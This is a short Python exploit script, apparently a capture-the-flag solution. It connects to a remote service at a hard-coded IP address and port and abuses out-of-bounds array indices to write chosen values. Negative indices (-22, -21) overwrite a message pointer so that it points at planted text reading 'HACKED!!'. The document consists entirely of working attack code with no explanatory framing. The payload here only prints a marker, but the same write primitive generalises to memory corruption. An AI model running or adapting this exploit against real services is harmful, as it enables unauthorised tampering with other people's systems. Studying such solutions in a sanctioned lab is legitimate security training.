#!/usr/bin/env python3
import socket, time, struct

s = socket.socket()
s.settimeout(15)
s.connect(('34.84.25.24', 58554))

# Write "HACKED!!" to values[0-2]
writes = [
    (0, struct.unpack('<I', b'HACK')[0]),
    (1, struct.unpack('<I', b'ED!!' )[0]),
    (2, 0),  # Null terminator
]

for idx, val in writes:
    s.recv(4096)
    s.sendall(f"{idx}\n".encode())
    time.sleep(0.1)
    s.recv(4096)
    s.sendall(f"{val}\n".encode())
    time.sleep(0.1)

# Point msg to values[0]
s.recv(4096)
s.sendall(b"-22\n")
time.sleep(0.1)
s.recv(4096)
s.sendall(b"6295744\n")  # 0x6010c0
time.sleep(0.1)

s.recv(4096)
s.sendall(b"-21\n")
time.sleep(0.1)
s.recv(4096)
s.sendall(b"0\n")
time.sleep(0.1)

# Exit
s.recv(4096)
s.sendall(b"-1\n")
time.sleep(1)

output = s.recv(8192)
print(output.decode(errors='ignore'))

if b'HACKED' in output:
    print("\n[+] MSG OVERWRITE WORKS!")
